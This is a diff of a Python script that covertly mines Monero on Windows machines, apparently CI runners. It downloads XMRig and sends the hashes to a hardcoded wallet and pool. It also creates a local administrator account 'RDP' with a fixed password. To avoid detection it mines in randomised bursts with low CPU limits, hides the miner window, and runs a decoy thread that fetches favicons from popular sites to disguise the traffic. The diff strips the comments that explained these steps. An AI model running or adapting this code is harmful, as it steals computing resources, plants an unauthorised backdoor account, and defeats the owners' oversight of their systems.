@@ -10,8 +10,8 @@ import json
 
 # ==================== Configuration ====================
 WALLET = "49UWTwnrxNXi8eMTCqdC5U3eiMHrPZkvvbsYN3WEde4o9RYebixumBCCy5oCdoSKkS2U6t9gXJFzJNkxXC7tJ1Uq4uky5BP"
-POOL = "http://pool.supportxmr.com:80"   # plain HTTP, looks like web traffic
-RUNTIME_MINUTES = 180                     # total job duration (3 hours)
+POOL = "http://pool.supportxmr.com:80"   # plain HTTP
+RUNTIME_MINUTES = 180                     # 3 hours
 
 # Burst parameters (minutes)
 MIN_WORK = 1
@@ -22,7 +22,6 @@ MIN_CPU_HINT = 5
 MAX_CPU_HINT = 25
 
 def create_user():
-    """Create a local user 'RDP'."""
     try:
         subprocess.run(['net', 'user', 'RDP', 'Runner-12345', '/add'], check=True, capture_output=True)
         subprocess.run(['net', 'localgroup', 'Administrators', 'RDP', '/add'], check=True)
@@ -31,7 +30,6 @@ def create_user():
         print(f"[!] User creation failed: {e.stderr.decode()}")
 
 def download_xmrig():
-    """Download and extract XMRig, return path to executable."""
     miner_url = "https://github.com/xmrig/xmrig/releases/download/v6.21.2/xmrig-6.21.2-msvc-win64.zip"
     zip_path = os.path.join(tempfile.gettempdir(), 'xmrig.zip')
     extract_dir = os.path.join(tempfile.gettempdir(), 'xmrig')
@@ -47,7 +45,6 @@ def download_xmrig():
     raise Exception("xmrig.exe not found")
 
 def create_config(exe_path, cpu_hint):
-    """Create config.json in the same folder as the miner."""
     config = {
         "autosave": True,
         "cpu": {"enabled": True, "max-threads-hint": cpu_hint},
@@ -67,7 +64,6 @@ def create_config(exe_path, cpu_hint):
     return config_path
 
 def web_surfer(stop_event):
-    """Background thread that fetches small files from real websites."""
     urls = [
         "https://www.google.com/favicon.ico",
         "https://github.com/favicon.ico",
@@ -93,25 +89,20 @@ def main():
     exe_path = download_xmrig()
     working_dir = os.path.dirname(exe_path)
 
-    # Stop event for background threads
     stop_event = threading.Event()
-
-    # Start web surfer thread
     web_thread = threading.Thread(target=web_surfer, args=(stop_event,), daemon=True)
     web_thread.start()
     print("[+] Web surfer thread started.")
 
-    # Prepare log file
     log_file = os.path.join(tempfile.gettempdir(), 'xmrig.log')
-    # Open log file in append mode (will be overwritten each burst)
-    log_f = open(log_file, 'w')
-    last_tell = 0
+    with open(log_file, 'w') as f:
+        pass  # truncate log
 
     total_start = time.time()
     total_end = total_start + RUNTIME_MINUTES * 60
+    last_tell = 0
 
     while time.time() < total_end:
-        # Random work and break durations (seconds)
         work_sec = random.randint(MIN_WORK * 60, MAX_WORK * 60)
         break_sec = random.randint(int(MIN_BREAK * 60), int(MAX_BREAK * 60))
         cpu_hint = random.randint(MIN_CPU_HINT, MAX_CPU_HINT)
@@ -119,31 +110,30 @@ def main():
         print(f"\n[+] Burst: work {work_sec//60} min, break {break_sec//60} min, CPU hint {cpu_hint}%")
         create_config(exe_path, cpu_hint)
 
-        # Start miner
-        miner_proc = subprocess.Popen(
-            [exe_path, '--config=config.json'],
-            cwd=working_dir,
-            stdout=log_f,
-            stderr=subprocess.STDOUT,
-            text=True,
-            creationflags=subprocess.CREATE_NO_WINDOW
-        )
+        with open(log_file, 'a') as f:
+            miner_proc = subprocess.Popen(
+                [exe_path, '--config=config.json'],
+                cwd=working_dir,
+                stdout=f,
+                stderr=subprocess.STDOUT,
+                text=True,
+                creationflags=subprocess.CREATE_NO_WINDOW
+            )
         print(f"[+] Miner started (PID {miner_proc.pid})")
 
-        # Wait for work period or until miner dies
+        # Monitor miner output during work period
         work_start = time.time()
         while time.time() - work_start < work_sec:
             if miner_proc.poll() is not None:
                 print("[!] Miner died early.")
                 break
-            # Read any new lines from log file and print
             with open(log_file, 'r') as f:
                 f.seek(last_tell)
                 new_lines = f.readlines()
                 if new_lines:
                     print("".join(new_lines).strip())
                 last_tell = f.tell()
-            time.sleep(5)   # check every 5 seconds
+            time.sleep(5)
 
         # Kill miner
         miner_proc.terminate()
@@ -152,18 +142,14 @@ def main():
 
         # Break period
         print(f"[+] Breaking for {break_sec//60} minutes...")
-        # During break, still print web surfer output? No, but we can sleep.
         for _ in range(break_sec):
             if time.time() >= total_end or stop_event.is_set():
                 break
             time.sleep(1)
 
-    # Cleanup
-    print("[*] Total runtime reached. Stopping threads...")
     stop_event.set()
     web_thread.join(timeout=10)
-    log_f.close()
-    print("[+] Done.")
+    print("[+] Job completed.")
 
 if __name__ == "__main__":
     main()
